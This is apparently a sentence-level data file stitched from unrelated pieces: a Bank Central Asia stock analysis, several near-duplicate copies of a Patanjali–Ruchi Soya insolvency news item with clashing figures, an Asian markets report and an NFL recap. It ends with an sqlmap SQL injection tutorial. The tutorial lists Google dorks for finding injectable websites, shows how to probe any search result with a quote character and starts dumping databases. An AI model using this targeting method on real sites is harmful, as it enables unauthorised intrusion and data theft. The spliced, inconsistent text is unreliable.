"In pursuing this higher loan growth, the bank allowed its Loan to Deposit Ratio to increase by a significantly higher margin than it had in previous years.",-1,0
"Its loan to deposit ratio increased by around 6.2%.",-1,0
"(Source: Company Fillings)
A strong liquidity buffer had long been one of the banks key drawing factors for investors wherefore investors in Bank Central Asia should monitor these changes on an ongoing basis.",-1,0
"The increase in the LDR was also partially driven by a decline in time deposits.",-1,0
"Time deposits declined by around 9.2% whilst Current Account and Savings Account, otherwise known as CASA, deposits grew by around 11.2% YoY and total deposits by 6.9% YoY.",-1,0
"The bank is likely to continue focusing on strong CASA growth going forward as this is the banks cheapest source of funds.",-1,0
"The banks LDR also remains the lowest of the major Indonesian banks and still has some room for further increase without eliminating its strong liquidity buffer provided it does not cross the 87-90% range.",-1,0
"The bank also reported a 9.9% YoY increase in Net Profit whilst maintaining its industry leading Return on Assets.",-1,0
"Its ROA increased by 10-basis points YoY to reach 3.9% at a time when many other Indonesian banks saw their ROA decline.",-1,0
"Its ROE for FY2018 is also expected to come in at around 18.3% which is rivalled only by the 18.5% expected for Bank Rakyat Indonesia (OTCPK:BKRKY).",-1,0
"With its strong deposit base and increased investment in mobile banking, Bank Central Asia is likely to continue displaying reasonable growth rates.",-1,0
"This is in a country where only around half of the population are banked but more than 75% own a mobile phone.",-1,0
"Bank Central Asia along with Bank Rakyat Indonesia currently have the most complete range of digital banking products and services, from conventional internet banking to quick response (QR) code payment applications.",-1,0
"The continued growth in CASA deposits relative to its overall funding mix will also help the bank to maintain its low COF and further strengthen its competitive position.",-1,0
"Valuation and Conclusion
Bank Central Asia is currently trading at a forward P/E ratio of around 24.9 which is the highest of the major Indonesian banks.",-1,0
"Its forward price to book value at around 4.29 is also the highest of the major Indonesian banks and partially driven by the banks long history of strong book value growth.",-1,0
"Its book value has by way of example grown by around 13% this year.",-1,0
"(Source: Reuters)
Despite the banks superior ROE, ROA and strong book value growth I remain somewhat concerned that the premium on the stock price is currently too steep.",-1,0
"Whilst the bank will deservedly likely to continue trading at a premium to its peers in my view it should not trade at a premium of more than 10% on P/B to peers such as Bank Rakyat Indonesia which has similarly shown strong growth and maintained a high ROE.",-1,0
"The premium to Bank Rakyat then being justified largely by Bank Central Asias superior deposit mix.",-1,0
"(Source: Reuters)
It can therefore be said that long term investors seeking exposure to high growth emerging markets such as Indonesia could be well served by holding this bank in their portfolio.",-1,0
"The current valuation is, however, somewhat high wherefore I would not personally initiate a full position at this point of time.",-1,0
"Initiating a small entry level position and gradually increasing that if any improvement in valuation occurs may nevertheless also be a prudent strategy for investors who fear missing out on the potential growth.",-1,0
"Disclosure:I/we have no positions in any stocks mentioned, and no plans to initiate any positions within the next 72 hours.I wrote this article myself, and it expresses my own opinions.",-1,0
"I am not receiving compensation for it (other than from Seeking Alpha).",-1,0
"I have no business relationship with any company whose stock is mentioned in this article.",-1,0
"Editor's Note: This article discusses one or more securities that do not trade on a major U.S. exchange.",-1,0
"Please be aware of the risks associated with these stocks.",-1,0
"New Delhi: Baba Ramdev’s Patanjali Ayurved is still interested in taking over bankruptcy-bound Ruchi Soya after the highest bidder Adani Wilmar wrote to resolution professional raising concerns over deterioration of asset quality of the edible oil firm due to delay in completion of the insolvency process.",-1,0
"In December 2017, Indore-based Ruchi Soya Industries entered the Corporate Insolvency Resolution Process (CIRP).",-1,0
"Shailendra Ajmera was appointed resolution professional (RP) by the NCLT on the application of creditors Standard Chartered Bank and DBS Bank under the Insolvency and Bankruptcy Code.",-1,0
"According to sources, Adani Wilmar, which was declared as the highest bidder in August to acquire Ruchi Soya with around Rs 6,000 crore offer after long drawn battle with Patanjali, has written to the RP regarding significant delays in resolution process, which is leading to deterioration of the assets.",-1,0
"The company has asked the RP why should it buy the deteriorated assets at the same price, they said, adding that the process was getting delayed as Patanjali moved to the NCLT Mumbai challenging the lenders decision.",-1,0
"When contacted, S K Tijarawala, the spokesperson of Patanjali that stood second in the bidding process, said it is interested in acquiring Ruchi Soya.",-1,0
"“Yes, we are interested.",-1,0
"If we are allowed, then we are ready for the takeover of Ruchi Soya as it is,” he told PTI.",-1,0
"Patanjali has written to the commitee of creditors (CoC) that it would match the offer.",-1,0
"Stating that the assets of Ruchi Soya have deteriorated, Tijarawala said, “We are still interested in taking over of Ruchi Soya”.",-1,0
"When contacted, an Adani Wilmar spokesperson did not comment on the issue.",-1,0
"Patanjali Ayurved has approached the NCLT challenging the decision by Ruchi Soya’s lenders to approve Adani Wilmar’s Rs 6,000 crore takeover bid.",-1,0
"Patanjali group came second with a Rs 5,700 crore bid.",-1,0
"Meanwhile, Ruchi Soya, in a filing to the BSE, on Monday said that the “resolution plan submitted by the successful resolution applicant is currently pending for approval before NCLT, Mumbai.” The next date of hearing is January 15, it added.",-1,0
"Ruchi Soya has a total debt of about Rs 12,000 crore.",-1,0
"The company has many manufacturing plants and its leading brands include Nutrela, Mahakosh, Sunrich, Ruchi Star and Ruchi Gold.",-1,0
"Adani Wilmar was selected by the CoC after two-rounds of bidding.",-1,0
"Before moving the NCLT, Patanjali Ayurved had questioned the eligibility of Adani Group to participate in the bidding process.",-1,0
"It had also sought to know the parameters adopted by the RP to declare Adani Wilmar as the highest bidder.",-1,0
"The Haridwar-based firm also had questioned the appointment of Cyril Amarchand Mangaldas as the RP’s legal advisor as the said law firm was already advising Adani Group.",-1,0
"This story has been published from a wire agency feed without modifications to the text.",-1,0
"Baba Ramdev's Patanjali Ayurved is still interested in taking over bankruptcy-bound Ruchi Soya after the highest bidder Adani Wilmar wrote to resolution professional raising concerns over deterioration of asset quality of the edible oil firm due to delay in completion of the insolvency process.",-1,0
"In December 2017, Indore-based Ruchi Soya Industries entered the Corporate Insolvency Resolution Process (CIRP).",-1,0
"Shailendra Ajmera was appointed resolution professional (RP) by the NCLT on the application of creditors Standard Chartered Bank and DBS Bank under the Insolvency and Bankruptcy Code.",-1,0
"According to sources, Adani Wilmar, which was declared as the highest bidder in August to acquire Ruchi Soya with around Rs 6,000 crore offer after long drawn battle with Patanjali, has written to the RP regarding significant delays in resolution process, which is leading to deterioration of the assets.",-1,0
"The company has asked the RP why should it buy the deteriorated assets at the same price, they said, adding that the process was getting delayed as Patanjali moved to the NCLT Mumbai challenging the lenders decision.",-1,0
"When contacted, S K Tijarawala, the spokesperson of Patanjali that stood second in the bidding process, said it is interested in acquiring Ruchi Soya.",-1,0
""Yes, we are interested.",-1,0
"If we are allowed, then we are ready for the takeover of Ruchi Soya as it is," he told PTI.",-1,0
"Patanjali has written to the commitee of creditors (CoC) that it would match the offer.",-1,0
"Stating that the assets of Ruchi Soya have deteriorated, Tijarawala said, "We are still interested in taking over of Ruchi Soya".",-1,0
"When contacted, an Adani Wilmar spokesperson did not comment on the issue.",-1,0
"Patanjali Ayurved has approached the NCLT challenging the decision by Ruchi Soya's lenders to approve Adani Wilmar's Rs 6,000 crore takeover bid.",-1,0
"Patanjali group came second with a Rs 5,700 crore bid.",-1,0
"Meanwhile, Ruchi Soya, in a filing to the BSE, on December 24 said that the "resolution plan submitted by the successful resolution applicant is currently pending for approval before NCLT, Mumbai."",-1,0
"The next date of hearing is January 15, it added.",-1,0
"Ruchi Soya has a total debt of about Rs 12,000 crore.",-1,0
"The company has many manufacturing plants and its leading brands include Nutrela, Mahakosh, Sunrich, Ruchi Star and Ruchi Gold.",-1,0
"Adani Wilmar was selected by the CoC after two-rounds of bidding.",-1,0
"Before moving the NCLT, Patanjali Ayurved had questioned the eligibility of Adani Group to participate in the bidding process.",-1,0
"It had also sought to know the parameters adopted by the RP to declare Adani Wilmar as the highest bidder.",-1,0
"A man walks in the business area in Bangkok, May 22, 2015.",-1,0
"(Reuters file photo)
Most Southeast Asian stock markets, including the Stock Exchange of Thailand, remained subdued on Monday as political uncertainty in the United States continued to dampen investors' risk appetite.",-1,0
"A cautious mood pervaded in broader Asia as market participants evaluated a government shutdown in the world's largest economy, as well as rumours of a change in its central bank head.",-1,0
"Local trading volumes were also low in light of the holiday season.",-1,0
"Thailand's index was largely flat, as shares of oil and gas explorer PTT Plc - which fell as much as 1.1% - declined in tandem with oil prices, while infrastructure developer Bangkok Expressway and Metro Plc's stock supported the index by gaining as much as 4.6%.",-1,0
"The Singapore benchmark index was also largely flat, as mild gains in financial stocks were offset by declines in industrial and consumer stocks.",-1,0
"The index was set for its third straight session of losses.",-1,0
"Singapore Telecommunications' stock ranked among the largest intraday losers on the index, while that of banking heavyweight DBS Group rose about 0.5%.",-1,0
"The island state's bourse was slated to close early ahead of Christmas.",-1,0
"Trading volumes stood at a fraction of their 30-day average.",-1,0
"Meanwhile, indexes of Vietnam and Malaysia rose marginally, while Philippine and Indonesian markets were closed until Wednesday.",-1,0
"NEW DELHI: Baba Ramdev's Patanjali Ayurved is still interested in taking over bankruptcy-bound Ruchi Soya after the highest bidder Adani Wilmar wrote to resolution professional raising concerns over deterioration of asset quality of the edible oil firm due to delay in completion of the insolvency process.",-1,0
"In December 2017, Indore-based Ruchi Soya Industries entered the Corporate Insolvency Resolution Process (CIRP).",-1,0
"Shailendra Ajmera was appointed resolution professional (RP) by the NCLT on the application of creditors Standard Chartered Bank and DBS Bank under the Insolvency and Bankruptcy Code.",-1,0
"According to sources, Adani Wilmar, which was declared as the highest bidder in August to acquire Ruchi Soya with around Rs 6,000 crore offer after long drawn battle with Patanjali, has written to the RP regarding significant delays in resolution process, which is leading to deterioration of the assets.",-1,0
"The company has asked the RP why should it buy the deteriorated assets at the same price, they said, adding that the process was getting delayed as Patanjali moved to the NCLT Mumbai challenging the lenders decision.",-1,0
"When contacted, S K Tijarawala, the spokesperson of Patanjali that stood second in the bidding process, said it is interested in acquiring Ruchi Soya.",-1,0
""Yes, we are interested.",-1,0
"If we are allowed, then we are ready for the takeover of Ruchi Soya as it is," he told PTI.",-1,0
"Patanjali has written to the commitee of creditors (CoC) that it would match the offer.",-1,0
"Stating that the assets of Ruchi Soya have deteriorated, Tijarawala said, "We are still interested in taking over of Ruchi Soya".",-1,0
"When contacted, an Adani Wilmar spokesperson did not comment on the issue.",-1,0
"Patanjali Ayurved has approached the NCLT challenging the decision by Ruchi Soya's lenders to approve Adani Wilmar's Rs 6,000 crore takeover bid.",-1,0
"Patanjali group came second with a Rs 5,700 crore bid.",-1,0
"Meanwhile, Ruchi Soya, in a filing to the BSE, on Monday said that the "resolution plan submitted by the successful resolution applicant is currently pending for approval before NCLT, Mumbai."",-1,0
"The next date of hearing is January 15, it added.",-1,0
"Ruchi Soya has a total debt of about Rs 12,000 crore.",-1,0
"The company has many manufacturing plants and its leading brands include Nutrela, Mahakosh, Sunrich, Ruchi Star and Ruchi Gold.",-1,0
"Adani Wilmar was selected by the CoC after two-rounds of bidding.",-1,0
"Before moving the NCLT, Patanjali Ayurved had questioned the eligibility of Adani Group to participate in the bidding process.",-1,0
"It had also sought to know the parameters adopted by the RP to declare Adani Wilmar as the highest bidder.",-1,0
"The Haridwar-based firm also had questioned the appointment of Cyril Amarchand Mangaldas as the RP's legal advisor as the said law firm was already advising Adani Group.",-1,0
"Baba Ramdev's Patanjali Ayurved is still interested in taking over bankruptcy-bound Ruchi Soya after the highest bidder Adani Wilmar wrote to resolution professional raising concerns over deterioration of asset quality of the edible oil firm due to delay in completion of the insolvency process.",-1,0
"In December 2017, Indore-based Ruchi Soya Industries entered the Corporate Insolvency Resolution Process (CIRP).",-1,0
"Shailendra Ajmera was appointed resolution professional (RP) by the NCLT on the application of creditors Standard Chartered Bank and DBS Bank under the Insolvency and Bankruptcy Code.",-1,0
"According to sources, Adani Wilmar, which was declared as the highest bidder in August to acquire Ruchi Soya with around Rs 60 billion offer after long drawn battle with Patanjali, has written to the RP regarding significant delays in resolution process, which is leading to deterioration of the assets.",-1,0
"The company has asked the RP why should it buy the deteriorated assets at the same price, they said, adding that the process was getting delayed as Patanjali moved to the NCLT Mumbai challenging the lenders decision.",-1,0
"When contacted, S K Tijarawala, the spokesperson of Patanjali that stood second in the bidding process, said it is interested in acquiring Ruchi Soya.",-1,0
""Yes, we are interested.",-1,0
"If we are allowed, then we are ready for the takeover of Ruchi Soya as it is," he told PTI.",-1,0
"Patanjali has written to the commitee of creditors (CoC) that it would match the offer.",-1,0
"Stating that the assets of Ruchi Soya have deteriorated, Tijarawala said, "We are still interested in taking over of Ruchi Soya".",-1,0
"When contacted, an Adani Wilmar spokesperson did not comment on the issue.",-1,0
"Patanjali Ayurved has approached the NCLT challenging the decision by Ruchi Soya's lenders to approve Adani Wilmar's Rs 60 billion takeover bid.",-1,0
"Patanjali group came second with a Rs 57 billion bid.",-1,0
"Meanwhile, Ruchi Soya, in a filing to the BSE, on Monday said that the "resolution plan submitted by the successful resolution applicant is currently pending for approval before NCLT, Mumbai."",-1,0
"The next date of hearing is January 15, it added.",-1,0
"Ruchi Soya has a total debt of about Rs 12 billion.",-1,0
"The company has many manufacturing plants and its leading brands include Nutrela, Mahakosh, Sunrich, Ruchi Star and Ruchi Gold.",-1,0
"Adani Wilmar was selected by the CoC after two-rounds of bidding.",-1,0
"Before moving the NCLT, Patanjali Ayurved had questioned the eligibility of Adani Group to participate in the bidding process.",-1,0
"It had also sought to know the parameters adopted by the RP to declare Adani Wilmar as the highest bidder.",-1,0
"The Haridwar-based firm also had questioned the appointment of Cyril Amarchand Mangaldas as the RP's legal advisor as the said law firm was already advising Adani Group.",-1,0
"Week 16 packed in some great games, some great plays, and some great laughs.",-1,0
"Let’s stop messing around and get into the good, the bad, the ugly, and the hilarious from Sunday’s action.",-1,0
"The most embarrassing celebration: Roosevelt Nix.",-1,0
"The Steelers fullback thought he picked up a huge first down on a wild/severly costly fake-punt attempt late in the fourth quarter against the Saints.",-1,0
"But he actually came up about a yard short, the Saints got the ball back and went down to score the game-winning TD.",-1,0
"Where have we seen a celebration like this one before?",-1,0
"Oh yeah, here:
The worst job by Santa Claus of sneaking a sip of a beer at an NFL game: Santa Claus.",-1,0
"We agree with the guy who tweeted this – Santa should be enjoying a nice IPA, not a $16 Budweiser.",-1,0
"But who can blame the big guy from enjoying a few cold ones during Sunday night’s Chiefs-Seahawks game?",-1,0
"He’s got a big week coming up, let him enjoy himself while he can.",-1,0
"Best job of trolling your old coach for an extended period of time: Baker Mayfield.",-1,0
"Mayfield stared down his former coach, Hue Jackson, for what seemed like the length of a “Game of Thrones” episode after a big play against the Bengals on Sunday.",-1,0
"It’s so fun having a QB with an attitude like this in the NFL this year.",-1,0
"So.",-1,0
"Much.",-1,0
"Fun.",-1,0
"Worst job by an NFL ref being an NFL ref: The ref who called this pass interference.",-1,0
"Seriously, how was this called PI on Joe Haden?",-1,0
"Just a brutal call that led to an early touchdown by the New Orleans Saints.",-1,0
"That was on fourth down so if they don’t call PI there the Steelers get the ball back and perhaps the game eventually has a different ending than it did.",-1,0
"Best tackle by a kicker: Matt Bosher.",-1,0
"Bosher not only lowered the boom on the Panthers’ kick returner but he also gave him a little stare down after doing it.",-1,0
"Gutsy move for a kicker.",-1,0
"Worst job of missing a teammate’s butt while kicking a FG: Kai Forbath.",-1,0
"I mean, Forbath didn’t come close to missing Chris Reed’s butt on this field goal attempt.",-1,0
"That’s the kinda stuff you learn on the first day as a kicker – don’t kick it off a teammate’s butt.",-1,0
"What a mistake.",-1,0
"Not the smartest place to deliver a late hit as a member of the 49ers: On the Bears sideline.",-1,0
"Richard Sherman has played long enough to know that this wouldn’t go well but he did it anyway.",-1,0
"A big fight broke out, which led to Sherman and two Bears WRs being thrown out of the game.",-1,0
"Best post-game locker room celebration: New Orleans Saints.",-1,0
"Saints WR Shane Wynn showed off some serious moves after the Saints beat the Steelers in an absolute thriller.",-1,0
"Best job of knowing you never hit the ground: Julien Edelman.",-1,0
"Pretty good awareness there by the Patriots wide receiver who bounced off two of Buffalo’s DBs and ran into the end zone for six points.",-1,0
"The worst job by an offensive lineman of staying on his feet: Chris Reed
Pretty rough day for Reed who, of course, had a field goal attempt kicked into his butt.",-1,0
"Well, this also happened to him, and it wasn’t pretty.",-1,0
"Worst job of defending a Hail Mary: Detroit Lions
Good job, good effort on that one, Lions secondary.",-1,0
"The most telling stat that shows you how dominant the Patriots dynasty has been: This 10-win one.",-1,0
"Number of 10 win seasons over the past 16 seasons: 1: OAK, CLE2: DET, WAS, TB3: SF, MIA, TEN, JAX, HOU, LAR4: ARI, NYJ5: MIN, DAL, NYG, LAC, CHI6: CIN, CAR7: ATL, BAL, DEN, NO8: PHI, SEA, KC9: 10: GB, PIT11: IND12: 13: 14:15:16: Patriots
— Field Yates (@FieldYates) December 23, 2018
Yup, the Patriots have been, as Larry David would say, pretty, pretty, pretty good over the years.",-1,0
"The Patriots, by the way, won their 10th straight AFC East title on Sunday, which is an NFL record.",-1,0
"Worst job of playing offense in the red zone: Jaguars 
Jaguars were in the red zone.",-1,0
"They ended up punting on a 4th-and-46.",-1,0
"— Andrew Siciliano (@AndrewSiciliano) December 23, 2018
That’s, like, really hard to do Jacksonville.",-1,0
"Best first touchdown pass thrown by a future Hall of Fame WR: Larry Fitzgerald
Fitzgerald has had a legendary career as a wide receiver and on Sunday he did something he’s never done before as he threw a TD pass to David Johnson.",-1,0
"Maybe the Cardinals should of had him play QB this whole time?",-1,0
"Nah, probably not.",-1,0
"Cris Collinsworth went old school with his slide in on SNF and people loved it
Kirk Cousins voice cracked so hard during awkward pre-snap cadence
Watch Larry Fitzgerald throw the first TD pass of his legendary career",-1,0
"Sqlmap is an open source penetration testing tool
that automates the process of detecting and exploiting SQL injection
flaws and taking over of database servers.",-1,0
"It comes with a powerful detection engine, many niche features for
the ultimate penetration tester and a broad range of switches lasting
from database fingerprinting, over data fetching from the database, to
accessing the underlying file system and executing commands on the
operating system via out-of-band connections.",-1,0
"Future of the Tool:
Full support for MySQL, Oracle,
PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite,
Firebird, Sybase, SAP MaxDB, HSQLDB and Informix database management systems.",-1,0
"Full support for six SQL injection techniques: boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries and out-of-band.",-1,0
"Support to directly connect to the database without passing via a SQL injection, by providing DBMS credentials, IP address, port and database name.",-1,0
"Support to enumerate users, password hashes, privileges, roles, databases, tables and columns.",-1,0
"Automatic recognition of password hash formats and support for cracking them using a dictionary-based attack.",-1,0
"Support to dump database tables
entirely, a range of entries or specific columns as per users choice.",-1,0
"The user can also choose to dump only a range of characters from each
columns entry.",-1,0
"Support to search for specific database names, specific tables across all databases or specific columns across all databases tables.",-1,0
"This is useful, for instance, to identify tables containing custom
application credentials where relevant columns names contain string
like name and pass.",-1,0
"Support to download and upload any file from the database server underlying file system when the database software is MySQL, PostgreSQL or Microsoft SQL Server.",-1,0
"Support to execute arbitrary commands and retrieve their standard output on the database server underlying operating system when the database software is MySQL, PostgreSQL or Microsoft SQL Server.",-1,0
"Support to establish an out-of-band stateful TCP connection between the attacker machine and the database server
underlying operating system.",-1,0
"This channel can be an interactive command
prompt, a Meterpreter session or a graphical user interface (VNC)
session as per users choice.",-1,0
"Support for database process user privilege escalation via Metasploits Meterpreter getsystemcommand.",-1,0
"Techniques:
sqlmap is able to detect and exploit five different SQL injection types:
Boolean-based blind:
sqlmap replaces or appends to the affected parameter in the HTTP
request, a syntatically valid SQL statement string containing a SELECT sub-statement, or any other SQL statement whose the user want to retrieve the output.",-1,0
"For each HTTP response, by making a comparison between the HTTP
response headers/body with the original request, the tool inference the
output of the injected statement character by character.",-1,0
"Alternatively,
the user can provide a string or regular expression to match on True
pages.",-1,0
"The bisection algorithm implemented in sqlmap to perform this
technique is able to fetch each character of the output with a maximum
of seven HTTP requests.",-1,0
"Where the output is not within the clear-text plain charset, sqlmap
will adapt the algorithm with bigger ranges to detect the output.",-1,0
"Time-based blind:
sqlmap replaces or appends to the affected parameter in the HTTP
request, a syntactically valid SQL statement string containing a query
which put on hold the back-end DBMS to return for a certain number of
seconds.",-1,0
"For each HTTP response, by making a comparison between the HTTP
response time with the original request, the tool inference the output
of the injected statement character by character.",-1,0
"Like for boolean-based
technique, the bisection algorithm is applied.",-1,0
"Error-based:
sqlmap replaces or appends to the affected parameter a
database-specific error message provoking statement and parses the HTTP
response headers and body in search of DBMS error messages containing
the injected pre-defined chain of characters and the subquery statement
output within.",-1,0
"This technique works only when the web application has been
configured to disclose back-end database management system error
messages.",-1,0
"UNION query-based:
sqlmap appends to the affected parameter a syntactically valid SQL statement starting with an UNION ALL SELECT.",-1,0
"This technique works when the web application page passes directly the output of the statementSELECT within a for loop, or similar, so that each line of the query output is printed on the page content.",-1,0
"sqlmap is also able to exploit partial (single entry) UNION query SQL injection vulnerabilities which occur when the output of the statement is not cycled in a for construct, whereas only the first entry of the query output is displayed.",-1,0
"Stacked queries:
also known as piggy backing:
sqlmap tests if the web application supports stacked queries and then,
in case it does support, it appends to the affected parameter in the
HTTP request, a semi-colon (;) followed by the SQL statement to be executed.",-1,0
"This technique is useful to run SQL statements other than SELECT, like for instance, data definition or data manipulation
statements, possibly leading to file system read and write access and
operating system command execution depending on the underlying back-end
database management system and the session user privileges.",-1,0
"Find a Vulnerable Website:
This is usually the toughest bit and takes longer than any other
steps.",-1,0
"Those who know how to use Google Dorks knows this already, but in
case you dont I have put together a number of strings that you can
search in Google.",-1,0
"Just copy paste any of the lines in Google and Google
will show you a number of search results.",-1,0
"Google dork:
A Google dork is an employee who unknowingly exposes sensitive
corporate information on the Internet.",-1,0
"The word dork is slang for a
slow-witted or in-ept person.",-1,0
"Google dorks put corporate information at risk because they
unwittingly create back doors that allow an attacker to enter a network
without permission and/or gain access to unauthorized information.",-1,0
"To
locate sensitive information, attackers use advanced search strings
called Google dork queries.",-1,0
"Google Dorks strings to find Vulnerable SQLMAP SQL injectable website:
Google Dork string Column 1
Google Dork string Column 2
Google Dork string Column 3
inurl:item_id=
inurl:review.php?id=
inurl:hosting_info.php?id=
inurl:newsid=
inurl:iniziativa.php?in=
inurl:gallery.php?id=
inurl:trainers.php?id=
inurl:curriculum.php?id=
inurl:rub.php?idr=
inurl:news-full.php?id=
inurl:labels.php?id=
inurl:view_faq.php?id=
inurl:news_display.php?getid=
inurl:story.php?id=
inurl:artikelinfo.php?id=
inurl:index2.php?option=
inurl:look.php?ID=
inurl:detail.php?ID=
inurl:readnews.php?id=
inurl:newsone.php?id=
inurl:index.php?=
inurl:top10.php?cat=
inurl:aboutbook.php?id=
inurl:profile_view.php?id=
inurl:newsone.php?id=
inurl:material.php?id=
inurl:category.php?id=
inurl:event.php?id=
inurl:opinions.php?id=
inurl:publications.php?id=
inurl:product-item.php?id=
inurl:announce.php?id=
inurl:fellows.php?id=
inurl:sql.php?id=
inurl:rub.php?idr=
inurl:downloads_info.php?id=
inurl:index.php?catid=
inurl:galeri_info.php?l=
inurl:prod_info.php?id=
inurl:news.php?catid=
inurl:tekst.php?idt=
inurl:shop.php?do=part&amp;id=
inurl:index.php?id=
inurl:newscat.php?id=
inurl:productinfo.php?id=
inurl:news.php?id=
inurl:newsticker_info.php?idn=
inurl:collectionitem.php?id=
inurl:index.php?id=
inurl:rubrika.php?idr=
inurl:band_info.php?id=
inurl:trainers.php?id=
inurl:rubp.php?idr=
inurl:product.php?id=
inurl:buy.php?category=
inurl:offer.php?idf=
inurl:releases.php?id=
inurl:article.php?ID=
inurl:art.php?idm=
inurl:ray.php?id=
inurl:play_old.php?id=
inurl:title.php?id=
inurl:produit.php?id=
inurl:declaration_more.php?decl_id=
inurl:news_view.php?id=
inurl:pop.php?id=
inurl:pageid=
inurl:select_biblio.php?id=
inurl:shopping.php?id=
inurl:games.php?id=
inurl:humor.php?id=
inurl:productdetail.php?id=
inurl:page.php?file=
inurl:aboutbook.php?id=
inurl:post.php?id=
inurl:newsDetail.php?id=
inurl:ogl_inet.php?ogl_id=
inurl:viewshowdetail.php?id=
inurl:gallery.php?id=
inurl:fiche_spectacle.php?id=
inurl:clubpage.php?id=
inurl:article.php?id=
inurl:communique_detail.php?id=
inurl:memberInfo.php?id=
inurl:show.php?id=
inurl:sem.php3?id=
inurl:section.php?id=
inurl:staff_id=
inurl:kategorie.php4?id=
inurl:theme.php?id=
inurl:newsitem.php?num=
inurl:news.php?id=
inurl:page.php?id=
inurl:readnews.php?id=
inurl:index.php?id=
inurl:shredder-categories.php?id=
inurl:top10.php?cat=
inurl:faq2.php?id=
inurl:tradeCategory.php?id=
inurl:historialeer.php?num=
inurl:show_an.php?id=
inurl:product_ranges_view.php?ID=
inurl:reagir.php?num=
inurl:preview.php?id=
inurl:shop_category.php?id=
inurl:Stray-Questions-View.php?num=
inurl:loadpsb.php?id=
inurl:transcript.php?id=
inurl:forum_bds.php?num=
inurl:opinions.php?id=
inurl:channel_id=
inurl:game.php?id=
inurl:spr.php?id=
inurl:aboutbook.php?id=
inurl:view_product.php?id=
inurl:pages.php?id=
inurl:preview.php?id=
inurl:newsone.php?id=
inurl:announce.php?id=
inurl:loadpsb.php?id=
inurl:sw_comment.php?id=
inurl:clanek.php4?id=
inurl:pages.php?id=
inurl:news.php?id=
inurl:participant.php?id=
 about.php?cartID=
inurl:avd_start.php?avd=
inurl:download.php?id=
 accinfo.php?cartId=
inurl:event.php?id=
inurl:main.php?id=
 add-to-cart.php?ID=
inurl:product-item.php?id=
inurl:review.php?id=
 addToCart.php?idProduct=
inurl:sql.php?id=
inurl:chappies.php?id=
 addtomylist.php?ProdId=
inurl:material.php?id=
inurl:read.php?id=
inurl:clanek.php4?id=
inurl:prod_detail.php?id=
inurl:announce.php?id=
inurl:viewphoto.php?id=
inurl:chappies.php?id=
inurl:article.php?id=
inurl:read.php?id=
inurl:person.php?id=
inurl:viewapp.php?id=
inurl:productinfo.php?id=
inurl:viewphoto.php?id=
inurl:showimg.php?id=
inurl:rub.php?idr=
inurl:view.php?id=
inurl:galeri_info.php?l=
inurl:website.php?id=
Step 1: Initial check to confirm if website is vulnerable to SQLMAP SQL Injection
For every string show above, you will get huundreds of search
results.",-1,0
"How do you know which is really vulnerable to SQLMAP SQL
Injection.",-1,0
"Theres multiple ways and I am sure people would argue which
one is best but to me the following is the simplest and most conclusive.",-1,0
"Lets say you searched using this string inurl:item_id= and one of the google search result shows a website like this:
http://www.gbhackers.com/products_showitem_clemco.php?item_id=28434
Just add a single quotation mark at the end of the URL.",-1,0
"(Just to
ensure, is a double quotation mark and is a single quotation
mark).",-1,0
"So now your URL will become like this:
http://www.gbhackers.com/products_showitem_clemco.php?item_id=28434'
If the page returns an SQL error, the page is vulnerable to SQLMAP
SQL Injection.",-1,0
"If it loads or redirect you to a different page, move on
to the next site in your Google search results page.",-1,0
"See example error below in the screenshot.",-1,0
"Ive obscured everything including URL and page design for obvious reasons.",-1,0
"Examples of SQLi Errors from Different Databases and Languages
Microsoft SQL Server
Server Error in / Application.",-1,0
"Unclosed quotation mark before the character string attack;.",-1,0
"Description: An unhanded exception occurred during the execution of
the current web request.",-1,0
"Please review the stack trace for more
information about the error where it originated in the code.",-1,0
"Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark before the character string attack;.",-1,0
"MySQL Errors
Warning: mysql_fetch_array(): supplied argument is not a valid MySQL
result resource in /var/www/myawesomestore.com/buystuff.php on line 12
Error: You have an error in your SQL syntax: check the manual that
corresponds to your MySQL server version for the right syntax to use
near at line 12
Oracle Errors
java.sql.SQLException: ORA-00933: SQL command not properly ended at
oracle.jdbc.dbaaccess.DBError.throwSqlException(DBError.java:180) at
oracle.jdbc.ttc7.TTIoer.processError(TTIoer.java:208)
Error: SQLExceptionjava.sql.SQLException: ORA-01756: quoted string not properly terminated
PostgreSQL Errors
Query failed: ERROR: unterminated quoted string at or near 
Step 2: List DBMS databases using SQLMAP SQL Injection:
As you can see from the screenshot above, Ive found a SQLMAP SQL
Injection vulnerable website.",-1,0
"Now I need to list all the databases in
that Vulnerable database.",-1,0
